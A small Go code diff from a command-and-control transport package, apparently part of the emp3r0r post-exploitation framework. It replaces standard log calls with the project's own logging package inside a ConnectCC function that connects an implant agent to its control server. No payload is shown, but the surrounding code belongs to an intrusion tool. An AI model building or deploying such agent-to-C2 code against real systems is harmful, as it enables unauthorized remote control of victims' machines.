@@ -3,7 +3,7 @@ package c2transport
 import (
 	"context"
 	"fmt"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net/http"
 	"time"
 
@@ -24,7 +24,7 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 			"AgentUUIDSig": {common.RuntimeConfig.AgentUUIDSig},
 		},
 	}
-	log.Printf("ConnectCC: connecting to %s", url)
+	logging.Printf("ConnectCC: connecting to %s", url)
 
 	type connectResult struct {
 		conn *h2conn.Conn
@@ -46,7 +46,7 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 
 		if err != nil {
 			err = fmt.Errorf("connectCC: initiate h2 conn: %s", err)
-			log.Print(err)
+			logging.Print(err)
 			cancel()
 			return
 		}
